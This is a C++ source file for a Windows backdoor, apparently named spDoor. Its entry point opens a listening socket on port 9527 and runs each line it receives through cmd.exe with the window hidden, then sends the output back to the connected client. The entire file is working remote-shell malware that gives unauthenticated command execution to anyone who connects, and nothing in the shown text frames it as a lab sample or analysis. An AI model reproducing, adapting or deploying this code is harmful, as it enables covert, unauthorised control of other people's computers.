
#include "spDoor.h"

BOOL SocketInit()
{
	WSADATA wsaData = {0};
	if ( WSAStartup(MAKEWORD(2, 2), &wsaData) == NO_ERROR ) {
		return TRUE;
	}else{
		return FALSE;
	}
}

int SendData(SOCKET m_Sock, void *pBuf, DWORD dwBufLen)
{
	if ( m_Sock == INVALID_SOCKET || !pBuf || dwBufLen <= 0 ) {
		return -1;
	}
	int iCurrSend = 0, offset = 0;
	do {
		iCurrSend = send(m_Sock, (char *)pBuf+offset, dwBufLen, 0);
		if ( iCurrSend <= 0 ) {
			break;
		}
		dwBufLen -= iCurrSend;
		offset += iCurrSend;
	} while ( dwBufLen > 0 );
	return offset;
}

BOOL bExit = FALSE;
#define RECV_BUF_LEN 4096
#define CMD_BUF_LEN 500

DWORD WINAPI ThreadOutputProc(LPVOID lpParam)
{
	CThreadNode tNode = *(CThreadNode *)lpParam;
	char szBuf[RECV_BUF_LEN] = {0};
	DWORD dwReadLen = 0, dwTotalAvail = 0;
	BOOL bRet = FALSE;
	while ( !bExit ) {
		dwTotalAvail = 0;
		bRet = PeekNamedPipe(tNode.hPipe, NULL, 0, NULL, &dwTotalAvail, NULL);
		if ( bRet && dwTotalAvail > 0 ) {
			bRet = ReadFile(tNode.hPipe, szBuf, RECV_BUF_LEN, &dwReadLen, NULL);
			if ( bRet && dwReadLen > 0 ) {
				SendData(tNode.m_Sock, szBuf, dwReadLen);
			}
		}
		Sleep(50);
	}
	return TRUE;
}

void CheckBackKey(LPTSTR lpszBuf, size_t iBufSize)
{
	if ( !lpszBuf || iBufSize <= 0 ) {
		return;
	}
	size_t iBufLen = _tcslen(lpszBuf);
	iBufLen = (iBufLen > iBufSize) ? iBufSize : iBufLen;
	TCHAR *pszBuf = new TCHAR[iBufLen+1];
	ZeroMemory(pszBuf, iBufLen+1);
	for ( size_t idx = 0, jdx = 0; idx < iBufLen; idx++ ) {
		if ( lpszBuf[idx] != VK_BACK && lpszBuf[idx] != 0 ) {
			pszBuf[jdx++] = lpszBuf[idx];
		}else if ( lpszBuf[idx] == VK_BACK ) {
			jdx--;
		}
	}
	ZeroMemory((void *)lpszBuf, iBufSize);
	_tcscpy_s(lpszBuf, iBufSize, pszBuf);
	delete [] pszBuf;
}

BOOL StartShell(UINT uPort)
{
	if ( !SocketInit() ) {
		return FALSE;
	}
	SOCKET m_ListenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if ( m_ListenSock == INVALID_SOCKET ) {
		return FALSE;
	}
	sockaddr_in sServer = {0};
	sServer.sin_family = AF_INET;
	sServer.sin_addr.s_addr = htonl(INADDR_ANY);
	sServer.sin_port = htons(uPort);
	if ( bind(m_ListenSock, (sockaddr *)&sServer, sizeof(sServer)) == SOCKET_ERROR ) {
		return FALSE;
	}
	if ( listen(m_ListenSock, 5) == SOCKET_ERROR ) {
		return FALSE;
	}
	SOCKET m_AcceptSock = accept(m_ListenSock, NULL, NULL);
	if ( m_AcceptSock == INVALID_SOCKET ) {
		return FALSE;
	}
	int iRecved = 0;
	BOOL bRet = FALSE;
	DWORD dwTotalAvail = 0, dwReadLen = 0, dwThreadID = 0;
	TCHAR szCmdLine[CMD_BUF_LEN] = {0}, szBuf[RECV_BUF_LEN] = {0}, szCmdBuf[CMD_BUF_LEN] = {0};
	SECURITY_ATTRIBUTES sa = {0};
	HANDLE hReadPipe = NULL, hWritePipe = NULL;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if ( !CreatePipe(&hReadPipe, &hWritePipe, &sa, 0) ) {
		return FALSE;
	}
	PROCESS_INFORMATION pi = {0};
	STARTUPINFO si = {0};
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	//si.hStdInput = hReadPipe;
	si.hStdOutput = si.hStdError = hWritePipe;
	si.wShowWindow = SW_HIDE;
	CThreadNode m_ReadNode;
	m_ReadNode.m_Sock = m_AcceptSock;
	m_ReadNode.hPipe = hReadPipe;
	HANDLE hThread = CreateThread(NULL, 0, ThreadOutputProc, &m_ReadNode, 0, &dwThreadID);
	while ( TRUE ) {
		ZeroMemory(szBuf, RECV_BUF_LEN);
		iRecved = recv(m_AcceptSock, szBuf, RECV_BUF_LEN, 0);
		if ( iRecved > 0 && iRecved != SOCKET_ERROR ) {
			_tcscat_s(szCmdBuf, CMD_BUF_LEN, szBuf);
			if ( _tcsstr(szCmdBuf, _T("\r\n")) ) {
				//Run the command;
				CheckBackKey(szCmdBuf, RECV_BUF_LEN);
				ZeroMemory(szCmdLine, CMD_BUF_LEN);
				GetSystemDirectory(szCmdLine, CMD_BUF_LEN);
				_tcscat_s(szCmdLine, CMD_BUF_LEN, _T("\\cmd.exe /c "));
				_tcsncat_s(szCmdLine, CMD_BUF_LEN, szCmdBuf, _tcslen(szCmdBuf)-sizeof(_T("\r\n"))+1);
				if ( !CreateProcess(NULL, szCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi) ) {
					continue;
				}else{
					ZeroMemory(szCmdBuf, CMD_BUF_LEN);
				}
			}
		}else{
			closesocket(m_AcceptSock);
			bExit = TRUE;
			WaitForSingleObject(hThread, INFINITE);
			break;
		}
		Sleep(100);
	}
	WSACleanup();
	return TRUE;
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
					   HINSTANCE hPrevInstance,
					   LPTSTR    lpCmdLine,
					   int       nCmdShow)
{
	StartShell(9527);
	return 0;
}